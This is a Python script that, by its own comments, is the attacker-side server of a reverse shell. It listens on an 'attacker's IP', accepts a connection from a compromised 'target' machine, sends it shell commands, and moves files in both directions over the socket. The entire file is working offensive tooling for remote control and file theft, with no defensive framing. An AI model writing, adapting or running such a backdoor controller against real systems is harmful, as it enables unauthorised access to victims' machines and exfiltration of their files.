import os          # For executing system commands (e.g., 'clear')
import socket      # For network communication
import json        # For serializing/deserializing data

# Server configuration (attacker's machine)
SERVER_IP = '192.168.254.49'  # Attacker's IP (Kali Linux)
SERVER_PORT = 5555            # Port to listen on

# Send data to the target reliably (JSON format)
def reliable_send(data):
    json_data = json.dumps(data)       # Convert data to JSON string
    target_sock.send(json_data.encode())  # Encode and send over socket

# Receive data from the target, handling partial packets
def reliable_recv():
    data = ''
    while True:
        try:
            # Receive data in chunks and decode
            data = data + target_sock.recv(1024).decode().rstrip()
            return json.loads(data)  # Parse JSON into Python object
        except ValueError:
            continue  # Incomplete data, keep receiving

# Upload a file from attacker to target
def upload_file(filename):
    file = open(filename, 'rb')  # Open file in binary read mode
    target_sock.send(file.read())  # Send raw file data
    file.close()  # Close file after sending

# Download a file from target to attacker
def download_file(filename):
    file = open(filename, 'wb')  # Open file in binary write mode
    target_sock.settimeout(1)    # Set socket timeout for receiving chunks
    chunk = target_sock.recv(1024)  # Receive first chunk
    while chunk:  # While data is being received
        file.write(chunk)  # Write chunk to file
        try:
            chunk = target_sock.recv(1024)  # Receive next chunk
        except socket.timeout:  # Stop if timeout occurs (end of file)
            break
    target_sock.settimeout(None)  # Reset socket timeout
    file.close()  # Close file after writing

# Handle interactive communication with the target
def target_communication():
    while True:
        command = input(f'* Shell~{str(target_ip)}: ')  # Get command from attacker
        reliable_send(command)  # Send command to target
        if command == 'quit':   # Close connection
            break
        elif command[:3] == 'cd ':  # No output for 'cd' (handled client-side)
            pass
        elif command == 'clear':  # Clear attacker's terminal
            os.system('clear')
        elif command[:9] == 'download ':  # Download file from target
            download_file(command[9:])  # Extract filename and download
        elif command[:7] == 'upload ':   # Upload file to target
            upload_file(command[7:])     # Extract filename and upload
        else:
            result = reliable_recv()  # Receive command output from target
            print(result)  # Print the result

# Set up the server socket
server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_sock.bind((SERVER_IP, SERVER_PORT))  # Bind to attacker's IP and port

print('[+] Listening For Incoming Connections')
server_sock.listen(5)  # Allow up to 5 pending connections
target_sock, target_ip = server_sock.accept()  # Accept incoming connection
print(f'[+] Target Connected From: {str(target_ip)}')

# Start interactive shell
target_communication()
